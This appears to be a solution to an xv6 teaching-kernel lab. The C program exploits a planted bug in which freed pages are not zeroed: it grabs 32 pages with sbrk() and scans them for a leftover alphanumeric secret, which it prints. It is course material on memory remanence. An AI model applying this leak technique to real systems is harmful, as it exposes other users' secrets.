// attack: exploit the missing memset bug to read a secret from freed pages
// After "secret <str>" exits, its pages are freed but not zeroed.
// We call sbrk() to grab memory and scan for the secret string.
#include "kernel/types.h"
#include "user/user.h"

// check if a character is alphanumeric (secret is guaranteed alnum)
static int
isalnum(char c)
{
  return (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= '0' && c <= '9');
}

int
main(void)
{
  // allocate several pages to maximize chance of getting freed secret pages
  int pages = 32;
  char *mem = sbrk(pages * 4096);
  if (mem == (char *)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  int total = pages * 4096;

  // scan for a run of >= 4 alphanumeric chars followed by a null byte
  for (int i = 0; i < total - 1; i++) {
    if (!isalnum(mem[i]))
      continue;

    int j = 0;
    while (i + j < total && isalnum(mem[i + j]))
      j++;

    // must be at least 4 chars and followed by null terminator
    if (j >= 4 && i + j < total && mem[i + j] == '\0') {
      printf("%s\n", mem + i);
      exit(0);
    }
  }

  exit(0);
}
